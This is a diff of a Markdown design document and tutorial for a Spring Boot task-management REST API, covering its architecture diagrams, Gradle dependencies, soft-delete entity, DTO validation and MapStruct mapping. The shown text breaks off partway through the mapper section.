@@ -1,305 +1,465 @@
-# TaskManagerApplication — Complete Design Document & Tutorial
+# TaskManagerApplication — Design Document & Technical Tutorial
 
-> **Target audience:** Someone learning Spring Boot who wants to understand not just *what* the code does, but *why* every decision was made.
+> **Spring Boot 4.0.3 · Java 25 · PostgreSQL 16 · Flyway · MapStruct · Lombok · AntiSamy**
+>
+> Last updated: 2026-03-04
 
 ---
 
 ## Table of Contents
 
+> 📊 **This document contains 10 Mermaid diagrams.** If your viewer doesn't render them, open this file in GitHub, VS Code (with Mermaid extension), or any Mermaid-compatible Markdown viewer.
+
 1. [Project Overview](#1-project-overview)
-2. [Technology Stack](#2-technology-stack)
-3. [Project Structure](#3-project-structure)
-4. [Architecture: The Layered Design](#4-architecture-the-layered-design)
-5. [Layer-by-Layer Deep Dive](#5-layer-by-layer-deep-dive)
-   - 5.1 [Entry Point — `TaskManagerApplication.java`](#51-entry-point--taskmanagerapplicationjava)
-   - 5.2 [Model Layer — `Task.java`](#52-model-layer--taskjava)
-   - 5.3 [Repository Layer — `TaskRepository.java`](#53-repository-layer--taskrepositoryja)
-   - 5.4 [DTOs — Request & Response](#54-dtos--request--response)
-   - 5.5 [Mapper — `TaskMapper.java`](#55-mapper--taskmapperjava)
-   - 5.6 [Service Layer — `TaskService.java`](#56-service-layer--taskservicejava)
-   - 5.7 [Security Service — `SanitizationService.java`](#57-security-service--sanitizationservicejava)
-   - 5.8 [Controller Layer — `TaskController.java`](#58-controller-layer--taskcontrollerjava)
-   - 5.9 [Exception Handling](#59-exception-handling)
-6. [Configuration](#6-configuration)
-   - 6.1 [application.yaml (main)](#61-applicationyaml-main)
-   - 6.2 [application.yaml (test)](#62-applicationyaml-test)
-   - 6.3 [build.gradle.kts](#63-buildgradlekts)
-   - 6.4 [docker-compose.yml](#64-docker-composeyml)
-7. [Complete Request Lifecycle — Step by Step](#7-complete-request-lifecycle--step-by-step)
-8. [Spring Boot Key Concepts Explained](#8-spring-boot-key-concepts-explained)
-9. [Testing Strategy](#9-testing-strategy)
-   - 9.1 [Test Types Used](#91-test-types-used)
-   - 9.2 [TaskControllerTest](#92-taskcontrollertest)
-   - 9.3 [TaskServiceTest](#93-taskservicetest)
-   - 9.4 [SanitizationServiceTest](#94-sanitizationservicetest)
-   - 9.5 [GlobalExceptionHandlerTest](#95-globalexceptionhandlertest)
-   - 9.6 [TaskMapperTest](#96-taskmappertest)
-   - 9.7 [TaskManagerApplicationTests](#97-taskmanagerapplicationtests)
-10. [Code Coverage with JaCoCo](#10-code-coverage-with-jacoco)
-11. [API Reference](#11-api-reference)
-12. [Key Design Decisions Explained](#12-key-design-decisions-explained)
-13. [Common Errors and How They Are Handled](#13-common-errors-and-how-they-are-handled)
+2. [Architecture & Package Structure](#2-architecture--package-structure)
+3. [Build System — `build.gradle.kts` Deep Dive](#3-build-system--buildgradlekts-deep-dive)
+4. [The Entity — `Task.java`](#4-the-entity--taskjava)
+5. [DTOs — Request & Response Separation](#5-dtos--request--response-separation)
+6. [Mapper — `TaskMapper.java` (MapStruct)](#6-mapper--taskmapperjava-mapstruct)
+7. [Repository — `TaskRepository.java`](#7-repository--taskrepositoryjava)
+8. [Specifications — Dynamic Filtering](#8-specifications--dynamic-filtering)
+9. [Service Layer — `TaskService.java`](#9-service-layer--taskservicejava)
+10. [Controller Layer — `TaskController.java`](#10-controller-layer--taskcontrollerjava)
+11. [Input Sanitization — `SanitizationService.java`](#11-input-sanitization--sanitizationservicejava)
+12. [Exception Handling — Global Exception Handler](#12-exception-handling--global-exception-handler)
+13. [Configuration Classes](#13-configuration-classes)
+14. [Database Migrations — Flyway](#14-database-migrations--flyway)
+15. [Docker Setup](#15-docker-setup)
+16. [Application Configuration — YAML](#16-application-configuration--yaml)
+17. [Testing Strategy](#17-testing-strategy)
+18. [Request Lifecycle — End-to-End Walkthrough](#18-request-lifecycle--end-to-end-walkthrough)
+19. [Key Design Decisions & Trade-offs](#19-key-design-decisions--trade-offs)
+20. [Annotation Reference](#20-annotation-reference)
 
 ---
 
 ## 1. Project Overview
 
-**TaskManagerApplication** is a REST API built with Spring Boot that allows users to manage tasks (a to-do list backend). Users can:
+TaskManagerApplication is a RESTful CRUD microservice for managing tasks. It is designed as a production-oriented learning project that demonstrates enterprise Java patterns:
 
-- Create tasks with a title, optional description, and completion status.
-- Read all tasks or a specific task by ID.
-- Update any task.
-- Delete a task.
+| Concern | Technology |
+|---|---|
+| Runtime framework | Spring Boot 4.0.3 |
+| Language | Java 25 (Virtual Threads enabled) |
+| Database | PostgreSQL 16 (Dockerised) |
+| Schema management | Flyway (versioned SQL migrations) |
+| Object mapping | MapStruct 1.6.0 (compile-time code generation) |
+| Boilerplate reduction | Lombok (annotation-driven getters/setters/builders) |
+| Input sanitization | OWASP AntiSamy (XSS prevention) |
+| Build tool | Gradle (Kotlin DSL) |
+| Test coverage | JUnit 5 + Mockito + MockMvc, JaCoCo reports |
 
-The application protects against **XSS (Cross-Site Scripting)** attacks by sanitizing all user input before saving it. It also validates incoming data strictly and returns structured, human-readable error messages.
+### What It Does
+
+#### System Context Diagram
+
+```mermaid
+graph TB
+    Client["👤 Client<br/>(curl / Postman / Browser)"]
+    App["🟢 TaskManagerApplication<br/>Spring Boot 4.0.3<br/>Java 25 + Virtual Threads"]
+    DevDB["🐘 PostgreSQL 16<br/>(Dev — port 5432)"]
+    TestDB["🐘 PostgreSQL 16<br/>(Test — port 5433)"]
+    Flyway["📦 Flyway<br/>Schema Migrations"]
+    AntiSamy["🛡️ OWASP AntiSamy<br/>XSS Sanitization"]
+
+    Client -- "REST API<br/>JSON over HTTP<br/>port 9090" --> App
+    App -- "JDBC<br/>HikariCP Pool" --> DevDB
+    App -. "Tests only" .-> TestDB
+    App -- "On startup" --> Flyway
+    Flyway -- "V1, V2, V3<br/>SQL migrations" --> DevDB
+    App -- "sanitize(input)" --> AntiSamy
+
+    style App fill:#6DB33F,color:#fff,stroke:#333
+    style DevDB fill:#336791,color:#fff
+    style TestDB fill:#336791,color:#fff,stroke-dasharray: 5 5
+    style AntiSamy fill:#E8590C,color:#fff
+    style Flyway fill:#CC0200,color:#fff
+```
+
+```
+Client (curl / Postman / browser)
+   │
+   ▼
+┌──────────────────────────┐
+│  POST /api/tasks         │  Create a task
+│  GET  /api/tasks         │  List tasks (paginated, filterable)
+│  GET  /api/tasks/{id}    │  Get one task
+│  PUT  /api/tasks/{id}    │  Update a task
+│  DELETE /api/tasks/{id}  │  Soft-delete a task
+└──────────────────────────┘
+   │
+   ▼
+┌──────────────────────────┐
+│  PostgreSQL "tasks" table │
+└──────────────────────────┘
+```
 
 ---
 
-## 2. Technology Stack
+## 2. Architecture & Package Structure
 
-| Technology | Version | Purpose |
+The project follows the **Controller → Service → Repository** layered architecture, which is the standard Spring Boot pattern:
+
+### Layered Architecture Diagram
+
+```mermaid
+graph TB
+    subgraph HTTP["HTTP Layer"]
+        Client["👤 Client"]
+    end
+
+    subgraph Controller["Controller Layer"]
+        TC["TaskController<br/>@RestController"]
+    end
+
+    subgraph Service["Service Layer"]
+        TS["TaskService<br/>@Service"]
+        SS["SanitizationService<br/>@Service"]
+    end
+
+    subgraph Data["Data Access Layer"]
+        TR["TaskRepository<br/>@Repository"]
+        Spec["TaskSpecifications<br/>(Criteria API)"]
+    end
+
+    subgraph Cross["Cross-Cutting Concerns"]
+        GEH["GlobalExceptionHandler<br/>@RestControllerAdvice"]
+        TM["TaskMapper<br/>@Mapper (MapStruct)"]
+    end
+
+    subgraph DB["Database"]
+        PG["PostgreSQL 16"]
+    end
+
+    Client -- "HTTP Request<br/>JSON" --> TC
+    TC -- "delegates to" --> TS
+    TS -- "sanitize()" --> SS
+    TS -- "toEntity() / toDTO()" --> TM
+    TS -- "findAll(spec, pageable)" --> TR
+    TS -- "builds Specification" --> Spec
+    TR -- "JDBC / Hibernate" --> PG
+    TC -. "exceptions" .-> GEH
+    GEH -. "ErrorResponse<br/>JSON" .-> Client
+
+    style Controller fill:#4CAF50,color:#fff
+    style Service fill:#2196F3,color:#fff
+    style Data fill:#FF9800,color:#fff
+    style Cross fill:#9C27B0,color:#fff
+    style DB fill:#336791,color:#fff
+```
+
+### Spring Bean Dependency Graph
+
+```mermaid
+graph LR
+    subgraph "Spring IoC Container"
+        TC["TaskController"] --> TS["TaskService"]
+        TS --> TR["TaskRepository"]
+        TS --> TM["TaskMapper<br/>(MapStruct Impl)"]
+        TS --> SS["SanitizationService"]
+        TR --> DS["DataSource<br/>(HikariCP)"]
+        FC["FlywayConfig"] --> DS
+        FC --> FW["Flyway"]
+        JC["JpaConfig"] -.->|"@EnableJpaAuditing"| AEL["AuditingEntityListener"]
+    end
+
+    style TC fill:#4CAF50,color:#fff
+    style TS fill:#2196F3,color:#fff
+    style TR fill:#FF9800,color:#fff
+    style TM fill:#9C27B0,color:#fff
+    style SS fill:#E8590C,color:#fff
+```
+
+```
+src/main/java/com/taskmanager/app/
+├── TaskManagerApplication.java        ← Entry point (@SpringBootApplication)
+├── config/
+│   ├── JpaConfig.java                ← Enables JPA auditing (@EnableJpaAuditing)
+│   └── FlywayConfig.java            ← Explicit Flyway bean configuration
+├── controller/
+│   └── TaskController.java           ← REST API endpoints (@RestController)
+├── service/
+│   ├── TaskService.java              ← Business logic layer (@Service)
+│   └── SanitizationService.java      ← XSS input sanitisation (@Service)
+├── repository/
+│   └── TaskRepository.java           ← Data access layer (JPA + Specifications)
+├── model/
+│   └── Task.java                     ← JPA entity (@Entity)
+├── dto/
+│   ├── TaskRequestDTO.java           ← What clients SEND (input)
+│   └── TaskResponseDTO.java          ← What clients RECEIVE (output)
+├── mapper/
+│   └── TaskMapper.java               ← MapStruct: Entity ↔ DTO conversions
+├── specification/
+│   └── TaskSpecifications.java       ← JPA Criteria API dynamic filters
+└── exception/
+    ├── GlobalExceptionHandler.java    ← Catches all exceptions → JSON error bodies
+    ├── ErrorResponse.java             ← Structured error JSON format
+    ├── TaskNotFoundException.java     ← 404 exception
+    └── DuplicateTaskException.java    ← 409 exception
+```
+
+### Why This Structure?
+
+| Layer | Responsibility | Rule |
 |---|---|---|
-| **Java** | 25 | Programming language |
-| **Spring Boot** | 4.0.3 | Web framework, auto-configuration |
-| **Spring Data JPA** | (via Boot) | Database access via repositories |
-| **Hibernate** | (via JPA) | ORM — maps Java classes to DB tables |
-| **PostgreSQL** | 16 | Production database |
-| **H2** | (test scope) | In-memory database used only during tests |
-| **Lombok** | latest | Reduces boilerplate (getters, setters, constructors) |
-| **MapStruct** | 1.6.0.Beta1 | Auto-generates type-safe object mapper code |
-| **OWASP AntiSamy** | 1.7.4 | Sanitizes HTML/JS from user input (XSS protection) |
-| **Jakarta Validation** | (via Boot) | Bean validation annotations (@NotBlank, @Size, @NotNull) |
-| **JaCoCo** | (via Gradle plugin) | Code coverage measurement |
-| **JUnit 5** | 6.0.3 | Unit test framework |
-| **Mockito** | (via Boot Test) | Mocking collaborators in unit tests |
-| **AssertJ** | (via Boot Test) | Fluent assertion library |
-| **MockMvc** | (via Spring Test) | Testing HTTP endpoints without starting a server |
-| **Gradle** | (wrapper) | Build tool |
-| **Docker Compose** | — | Runs PostgreSQL in a container locally |
+| **Controller** | HTTP request/response handling | Never contains business logic |
+| **Service** | Business logic, validation, sanitization | Never knows about HTTP status codes |
+| **Repository** | Database access | Never contains business rules |
+| **DTO** | Data transfer shapes | Never contains logic |
+| **Mapper** | Translation between layers | Stateless, compile-time generated |
+| **Exception** | Error handling | Centralised, consistent error format |
+
+Each layer depends only on the layer directly below it. The controller never talks to the repository directly.
 
 ---
 
-## 3. Project Structure
+## 3. Build System — `build.gradle.kts` Deep Dive
 
-```
-TaskManagerApplication/
-├── build.gradle.kts                  ← Build config, dependencies, JaCoCo setup
-├── docker-compose.yml                ← Starts PostgreSQL container for local dev
-├── gradlew / gradlew.bat             ← Gradle wrapper scripts
-│
-├── src/
-│   ├── main/
-│   │   ├── java/com/taskmanager/app/
-│   │   │   ├── TaskManagerApplication.java    ← Entry point (@SpringBootApplication)
-│   │   │   ├── config/                        ← (backup only — H2ConsoleConfig)
-│   │   │   ├── controller/
-│   │   │   │   └── TaskController.java        ← HTTP endpoints
-│   │   │   ├── dto/
-│   │   │   │   ├── TaskRequestDTO.java        ← What client sends
-│   │   │   │   └── TaskResponseDTO.java       ← What server sends back
-│   │   │   ├── exception/
-│   │   │   │   ├── DuplicateTaskException.java
-│   │   │   │   ├── ErrorResponse.java
-│   │   │   │   ├── GlobalExceptionHandler.java
-│   │   │   │   └── TaskNotFoundException.java
-│   │   │   ├── mapper/
-│   │   │   │   └── TaskMapper.java            ← MapStruct interface
-│   │   │   ├── model/
-│   │   │   │   └── Task.java                  ← JPA Entity (maps to DB table)
-│   │   │   ├── repository/
-│   │   │   │   └── TaskRepository.java        ← Spring Data JPA repository
-│   │   │   └── service/
-│   │   │       ├── SanitizationService.java   ← XSS protection
-│   │   │       └── TaskService.java           ← Business logic
-│   │   └── resources/
-│   │       └── application.yaml              ← Main config (PostgreSQL, port 9090)
-│   │
-│   └── test/
-│       ├── java/com/taskmanager/app/
-│       │   ├── TaskManagerApplicationTests.java
-│       │   ├── controller/
-│       │   │   └── TaskControllerTest.java
-│       │   ├── exception/
-│       │   │   └── GlobalExceptionHandlerTest.java
-│       │   ├── mapper/
-│       │   │   └── TaskMapperTest.java
-│       │   └── service/
-│       │       ├── SanitizationServiceTest.java
-│       │       └── TaskServiceTest.java
-│       └── resources/
-│           └── application.yaml              ← Test config (H2 in-memory DB)
-│
-├── docs/
-│   ├── DESIGN_AND_TUTORIAL.md        ← This file
-│   └── GlobalExceptionHandlerDeepDive.md
-└── logs/
-    └── app.log                        ← Log file (auto-created at runtime)
-```
-
----
-
-## 4. Architecture: The Layered Design
-
-This project follows the **Layered Architecture** pattern (also called N-tier architecture). Each layer has a single, clear responsibility, and each layer only talks to the layer directly below it.
-
-```
-┌──────────────────────────────────────────────────────────┐
-│                    HTTP Client (browser/Postman/curl)     │
-└──────────────────────────┬───────────────────────────────┘
-                           │  HTTP Request (JSON)
-                           ▼
-┌──────────────────────────────────────────────────────────┐
-│               CONTROLLER LAYER                           │
-│   TaskController.java                                    │
-│   • Receives HTTP requests                               │
-│   • Validates request body (@Valid)                      │
-│   • Calls Service layer                                  │
-│   • Returns HTTP response (JSON)                         │
-└──────────────────────────┬───────────────────────────────┘
-                           │  calls
-                           ▼
-┌──────────────────────────────────────────────────────────┐
-│               SERVICE LAYER                              │
-│   TaskService.java + SanitizationService.java            │
-│   • Business logic lives here                            │
-│   • Sanitizes input (XSS protection)                     │
-│   • Checks for duplicates                                │
-│   • Uses mapper to convert between DTOs and Entities     │
-│   • Calls Repository layer                               │
-└──────────────────────────┬───────────────────────────────┘
-                           │  calls
-                           ▼
-┌──────────────────────────────────────────────────────────┐
-│               REPOSITORY LAYER                           │
-│   TaskRepository.java                                    │
-│   • Talks to the database                                │
-│   • Uses Spring Data JPA (no SQL needed!)                │
-└──────────────────────────┬───────────────────────────────┘
-                           │  SQL (via Hibernate)
-                           ▼
-┌──────────────────────────────────────────────────────────┐
-│               DATABASE                                   │
-│   PostgreSQL (prod) / H2 (test)                          │
-│   Table: "tasks"                                         │
-└──────────────────────────────────────────────────────────┘
-```
-
-**Why layering?**
-- **Separation of concerns**: Each layer does one thing only.
-- **Testability**: You can test the Service independently of the database by mocking the Repository.
-- **Maintainability**: Changing the database only affects the Repository layer; changing business rules only affects the Service layer.
-
----
-
-## 5. Layer-by-Layer Deep Dive
-
-### 5.1 Entry Point — `TaskManagerApplication.java`
-
-```java
-@SpringBootApplication
-public class TaskManagerApplication {
-    public static void main(String[] args) {
-        SpringApplication.run(TaskManagerApplication.class, args);
-    }
+```kotlin
+plugins {
+    java
+    jacoco                                                    // Code coverage reports
+    id("org.springframework.boot") version "4.0.3"            // Spring Boot plugin
+    id("io.spring.dependency-management") version "1.1.7"     // BOM-based version management
 }
 ```
 
-**What `@SpringBootApplication` does** — it's a shortcut for three annotations:
+### Why Kotlin DSL?
 
-| Annotation | What it does |
-|---|---|
-| `@SpringBootConfiguration` | Marks this as a Spring configuration class |
-| `@EnableAutoConfiguration` | Tells Spring Boot to automatically configure beans based on your classpath (e.g., if you have JPA on the classpath, it auto-configures Hibernate) |
-| `@ComponentScan` | Tells Spring to scan this package and all sub-packages for `@Component`, `@Service`, `@Repository`, `@Controller`, etc. |
+Gradle supports two DSLs: Groovy (`.gradle`) and Kotlin (`.gradle.kts`). Kotlin DSL provides:
+- **Type-safe** — IDE autocompletion and compile-time error checking
+- **Consistent syntax** — no ambiguity between method calls and property assignments
 
-`SpringApplication.run(...)` boots the entire application: starts the embedded Tomcat server, loads configuration, creates all beans, connects to the database.
+### Key Dependencies Explained
+
+```kotlin
+dependencies {
+    // --- CORE ---
+    implementation("org.springframework.boot:spring-boot-starter")          // Core Spring (DI, auto-config)
+    implementation("org.springframework.boot:spring-boot-starter-web")      // Embedded Tomcat + Spring MVC
+    implementation("org.springframework.boot:spring-boot-starter-data-jpa") // Hibernate + Spring Data JPA
+    implementation("org.springframework.boot:spring-boot-starter-validation") // Bean Validation (Jakarta)
+
+    // --- DATABASE ---
+    runtimeOnly("org.postgresql:postgresql")                 // PostgreSQL JDBC driver (runtime only)
+
+    // --- CODE GENERATION (compile-time only) ---
+    compileOnly("org.projectlombok:lombok")                  // Getters/setters/builders at compile time
+    annotationProcessor("org.projectlombok:lombok")          // Lombok annotation processor
+    implementation("org.mapstruct:mapstruct:1.6.0.Beta1")    // MapStruct runtime annotations
+    annotationProcessor("org.mapstruct:mapstruct-processor:1.6.0.Beta1") // MapStruct code generator
+    annotationProcessor("org.projectlombok:lombok-mapstruct-binding:0.2.0") // Lombok↔MapStruct bridge
+
+    // --- SECURITY ---
+    implementation("org.owasp.antisamy:antisamy:1.7.4")      // XSS sanitization engine
+
+    // --- SCHEMA MANAGEMENT ---
+    implementation("org.flywaydb:flyway-core")               // Flyway migration engine
+    implementation("org.flywaydb:flyway-database-postgresql") // Flyway PostgreSQL dialect
+}
+```
+
+### Scope Explained
+
+| Scope | Meaning | Example |
+|---|---|---|
+| `implementation` | Needed at compile time AND runtime | Spring Boot starters |
+| `runtimeOnly` | Only needed when the app runs, not for compilation | PostgreSQL JDBC driver |
+| `compileOnly` | Only needed during compilation, not packaged in JAR | Lombok |
+| `annotationProcessor` | Runs during compilation to generate code | Lombok, MapStruct |
+| `testImplementation` | Same as `implementation` but only for tests | JUnit, Mockito |
+
+### Why `lombok-mapstruct-binding`?
+
+Lombok and MapStruct both use annotation processing. Without the binding library, MapStruct runs before Lombok, meaning it can't see the getters/setters that Lombok generates. The binding ensures correct ordering: **Lombok runs first → MapStruct runs second**.
 
 ---
 
-### 5.2 Model Layer — `Task.java`
+## 4. The Entity — `Task.java`
+
+### Database Schema (Entity-Relationship Diagram)
+
+```mermaid
+erDiagram
+    TASKS {
+        BIGSERIAL id PK "Auto-increment primary key"
+        VARCHAR_100 title UK "NOT NULL, UNIQUE"
+        VARCHAR_500 description "Nullable"
+        BOOLEAN completed "NOT NULL, DEFAULT false"
+        BOOLEAN deleted "NOT NULL, DEFAULT false"
+        TIMESTAMP created_at "NOT NULL, auto-set on INSERT"
+        TIMESTAMP last_modified_at "Nullable, auto-set on UPDATE"
+        TIMESTAMP deleted_at "Nullable, set on soft-delete"
+    }
+
+    FLYWAY_SCHEMA_HISTORY {
+        INT installed_rank PK
+        VARCHAR version
+        VARCHAR description
+        VARCHAR type
+        VARCHAR script
+        INT checksum
+        TIMESTAMP installed_on
+    }
+```
+
+### Task Lifecycle — Soft Delete State Machine
+
+```mermaid
+stateDiagram-v2
+    [*] --> Active : POST /api/tasks<br/>(INSERT)
+
+    Active --> Active : PUT /api/tasks/id<br/>(UPDATE fields)
+    Active --> Completed : PUT completed=true
+    Completed --> Active : PUT completed=false
+
+    Active --> SoftDeleted : DELETE /api/tasks/id<br/>(UPDATE deleted=true)
+    Completed --> SoftDeleted : DELETE /api/tasks/id<br/>(UPDATE deleted=true)
+
+    SoftDeleted --> [*] : Row stays in DB<br/>(invisible to queries)
+
+    state Active {
+        [*] --> Pending : completed=false
+    }
+
+    state Completed {
+        [*] --> Done : completed=true
+    }
+
+    note right of SoftDeleted
+        @SQLDelete overrides DELETE to:
+        UPDATE tasks SET deleted=true,
+        deleted_at=NOW() WHERE id=?
+
+        @SQLRestriction("deleted=false")
+        hides soft-deleted rows from all SELECTs
+    end note
+```
 
 ```java
-@Entity
-@Table(name = "tasks")
-@Data
-@NoArgsConstructor
-@AllArgsConstructor
+@Entity                     // Tells Hibernate: this class maps to a DB table
+@Table(name = "tasks")      // Explicit table name (otherwise Hibernate uses "task")
+@SQLDelete(sql = "UPDATE tasks SET deleted = true, deleted_at = NOW() WHERE id = ?")
+@SQLRestriction("deleted = false")
+@Getter @Setter             // Lombok: generates all getters and setters
+@NoArgsConstructor          // Required by JPA — Hibernate creates instances via reflection
+@AllArgsConstructor         // Useful for test builders
+@EntityListeners(AuditingEntityListener.class)  // Auto-fills @CreatedDate / @LastModifiedDate
+@Builder                    // Lombok: fluent builder pattern for test code
 public class Task {
 
     @Id
-    @GeneratedValue(strategy = GenerationType.IDENTITY)
+    @GeneratedValue(strategy = GenerationType.IDENTITY)    // PostgreSQL BIGSERIAL auto-increment
     private Long id;
 
-    @Column(nullable = false, name = "title")
-    private String header;        // Java field named differently from DB column!
+    @Column(name = "title", nullable = false, unique = true)
+    private String header;             // ← Java field name ≠ DB column name!
 
+    @Column(name = "description", length = 500)
     private String description;
 
     @Column(nullable = false, columnDefinition = "boolean default false")
     private boolean completed;
+
+    @Column(name = "deleted", nullable = false)
+    @Builder.Default                   // Tells @Builder to use = false as the default
+    private boolean deleted = false;
+
+    @CreatedDate
+    @Column(name = "created_at", nullable = false, updatable = false)
+    private LocalDateTime createdAt;
+
+    @LastModifiedDate
+    @Column(name = "last_modified_at")
+    private LocalDateTime lastModifiedAt;
+
+    @Column(name = "deleted_at")
+    private LocalDateTime deletedAt;
 }
 ```
 
-**Key concepts:**
+### Design Decision: `header` vs `title`
 
-| Annotation | Meaning |
-|---|---|
-| `@Entity` | This class is a JPA-managed entity. Hibernate will create/manage the DB table. |
-| `@Table(name = "tasks")` | The DB table is named `tasks` (not `task`). |
-| `@Id` | This field is the primary key. |
-| `@GeneratedValue(IDENTITY)` | The DB auto-increments the ID (1, 2, 3…). We never set it manually. |
-| `@Column(nullable = false, name = "title")` | Maps Java field `header` to DB column `title`. The column cannot be NULL. |
-| `@Data` (Lombok) | Auto-generates: getters, setters, `toString()`, `equals()`, `hashCode()`. |
-| `@NoArgsConstructor` | JPA **requires** a no-argument constructor. Without it, Hibernate cannot instantiate objects. |
-| `@AllArgsConstructor` | Generates a constructor with all fields — useful in test code. |
+The Java field is named `header`, but the DB column is `title`. This is intentional — it demonstrates that **Java field names and DB column names don't have to match**. The `@Column(name = "title")` annotation handles the mapping. This pattern is common in legacy systems where you inherit a DB schema you can't change.
 
-**Important design note:** The Java field is `header` but the DB column is `title`. This is intentional — it demonstrates that the Java model and database schema can differ. The mapper (`TaskMapper`) handles translating between them.
+### Soft Delete Pattern
 
----
+Instead of physically removing rows with `DELETE FROM tasks WHERE id = ?`, the application uses **soft delete**:
 
-### 5.3 Repository Layer — `TaskRepository.java`
-
-```java
-@Repository
-public interface TaskRepository extends JpaRepository<Task, Long> {
-    boolean existsByHeaderAndCompletedFalse(String header);
-}
-```
-
-**This is the most "magical" part of Spring Boot.** `JpaRepository<Task, Long>` gives you these methods for free — you write zero SQL:
-
-| Method | SQL it generates |
-|---|---|
-| `findAll()` | `SELECT * FROM tasks` |
-| `findById(id)` | `SELECT * FROM tasks WHERE id = ?` |
-| `save(task)` | `INSERT INTO tasks (...)` or `UPDATE tasks SET ...` |
-| `delete(task)` | `DELETE FROM tasks WHERE id = ?` |
-| `existsById(id)` | `SELECT COUNT(*) > 0 FROM tasks WHERE id = ?` |
-
-**Custom query method:**
-```java
-boolean existsByHeaderAndCompletedFalse(String header);
-```
-Spring Data JPA **reads the method name** and generates the SQL:
 ```sql
-SELECT COUNT(*) > 0 FROM tasks WHERE title = ? AND completed = false
+-- What actually runs when you call taskRepository.delete(task):
+UPDATE tasks SET deleted = true, deleted_at = NOW() WHERE id = ?
 ```
-The naming convention is: `existsBy` + `Header` (field name) + `And` + `CompletedFalse` (field = false).
+
+This is implemented via two Hibernate annotations:
+
+| Annotation | Purpose |
+|---|---|
+| `@SQLDelete(sql = "UPDATE tasks SET deleted = true, ...")` | Overrides the SQL that Hibernate generates for `DELETE` |
+| `@SQLRestriction("deleted = false")` | Automatically appends `WHERE deleted = false` to every `SELECT` |
+
+**Why soft delete?**
+- **Audit trail** — you can see what was deleted and when
+- **Recovery** — accidentally deleted tasks can be restored
+- **Compliance** — some regulations require data retention
+
+### `@Builder.Default` — A Subtle Trap
+
+Without `@Builder.Default`, Lombok's `@Builder` ignores field initialisers:
+
+```java
+// WITHOUT @Builder.Default:
+private boolean deleted = false;
+Task.builder().header("test").build();  // deleted = false (by Java primitive default, NOT by = false)
+
+// WITH @Builder.Default:
+@Builder.Default
+private boolean deleted = false;
+Task.builder().header("test").build();  // deleted = false (explicitly from the initialiser)
+```
+
+For `boolean` primitives the result is the same (`false`), but for reference types like `String` or `List`, `@Builder.Default` is critical:
+
+```java
+@Builder.Default
+private List<String> tags = new ArrayList<>();  // Builder creates new ArrayList
+// vs
+private List<String> tags = new ArrayList<>();  // Builder sets tags = null !
+```
+
+### JPA Auditing
+
+The `@CreatedDate` and `@LastModifiedDate` annotations auto-fill timestamps:
+
+```java
+@EntityListeners(AuditingEntityListener.class)  // Activates auditing for this entity
+```
+
+This requires the `@EnableJpaAuditing` switch in `JpaConfig.java`. When a `Task` is:
+- **Created** → `createdAt` is automatically set to `now()`
+- **Updated** → `lastModifiedAt` is automatically set to `now()`
+
+No manual code needed. Spring's `AuditingEntityListener` intercepts JPA lifecycle events.
 
 ---
 
-### 5.4 DTOs — Request & Response
+## 5. DTOs — Request & Response Separation
 
-**DTO = Data Transfer Object.** DTOs are plain objects used to carry data between layers. They are NOT stored in the database.
+### Why Two DTOs?
 
-**Why have separate DTOs instead of using the entity directly?**
-- The entity might have fields you don't want to expose (e.g., internal flags, passwords).
-- The client and server can evolve independently.
-- You can add computed/derived fields (like `completionStatus`) that don't exist in the database.
+| | `TaskRequestDTO` | `TaskResponseDTO` |
+|---|---|---|
+| **Direction** | Client → Server | Server → Client |
+| **Has `id`?** | ❌ No (DB generates it) | ✅ Yes |
+| **Has `completionStatus`?** | ❌ No (server computes it) | ✅ Yes ("DONE" / "PENDING") |
+| **Has validation?** | ✅ `@NotBlank`, `@Size`, `@NotNull` | ❌ No (we trust our own output) |
+| **Has audit fields?** | ❌ No | ✅ `createdAt`, `lastModifiedAt` |
 
-#### TaskRequestDTO — What the client sends
+### `TaskRequestDTO` — Input Validation
 
 ```java
+@Getter @Setter @NoArgsConstructor @AllArgsConstructor @Builder
 public class TaskRequestDTO {
 
     @NotBlank(message = "Title is required")
@@ -310,138 +470,400 @@ public class TaskRequestDTO {
     private String description;
 
     @NotNull(message = "Completion status must be specified")
-    private Boolean completed;   // Boolean wrapper, not primitive boolean
+    private Boolean completed;   // ← Boolean wrapper, NOT primitive boolean!
 }
 ```
 
-**Validation annotations:**
-
-| Annotation | What it checks |
-|---|---|
-| `@NotBlank` | The string is not null, not empty, and not just whitespace |
-| `@Size(min, max)` | The string length is within bounds |
-| `@NotNull` | The value is not null |
-
-**Why `Boolean` (wrapper) instead of `boolean` (primitive)?**
-- Primitive `boolean` defaults to `false` if the field is omitted in JSON.
-- Wrapper `Boolean` defaults to `null` — so `@NotNull` can detect if the client forgot to send it.
-
-#### TaskResponseDTO — What the server sends back
+### Why `Boolean` (wrapper) instead of `boolean` (primitive)?
 
 ```java
-@Data
-public class TaskResponseDTO {
-    private Long id;
-    private String title;
-    private String description;
-    private boolean completed;
-    private String completionStatus;  // "DONE" or "PENDING" — computed, not in DB
-}
+// WRONG — primitive boolean:
+private boolean completed;
+// If the client sends: {"title": "Buy Milk"}  (omits "completed")
+// → completed = false (Java primitive default)
+// → @NotNull NEVER triggers! The field silently defaults to false.
+
+// CORRECT — Boolean wrapper:
+private Boolean completed;
+// If the client sends: {"title": "Buy Milk"}  (omits "completed")
+// → completed = null (object default)
+// → @NotNull TRIGGERS → 400 Bad Request: "Completion status must be specified"
 ```
 
-`completionStatus` is a **derived field** — it doesn't exist in the database. It's computed by the mapper based on the `completed` boolean. This is a clean way to enrich the response without polluting the database schema.
+This is a common Java validation trap. Always use wrapper types (`Boolean`, `Integer`, `Long`) when you need `@NotNull` validation.
 
 ---
 
-### 5.5 Mapper — `TaskMapper.java`
+## 6. Mapper — `TaskMapper.java` (MapStruct)
+
+### Data Mapping Flow Diagram
+
+```mermaid
+graph LR
+    subgraph "Client Input"
+        REQ["TaskRequestDTO<br/>─────────<br/>title: String<br/>description: String<br/>completed: Boolean"]
+    end
+
+    subgraph "MapStruct (compile-time)"
+        TE["toEntity()"]
+        TD["toDTO()"]
+    end
+
+    subgraph "JPA Entity"
+        ENT["Task<br/>─────────<br/>id: Long<br/>header: String<br/>description: String<br/>completed: boolean<br/>deleted: boolean<br/>createdAt: LocalDateTime<br/>lastModifiedAt: LocalDateTime<br/>deletedAt: LocalDateTime"]
+    end
+
+    subgraph "Client Output"
+        RES["TaskResponseDTO<br/>─────────<br/>id: Long<br/>title: String<br/>description: String<br/>completed: boolean<br/>completionStatus: String<br/>createdAt: LocalDateTime<br/>lastModifiedAt: LocalDateTime"]
+    end
+
+    REQ -- "title → header<br/>id = IGNORED<br/>deleted = IGNORED<br/>timestamps = IGNORED" --> TE
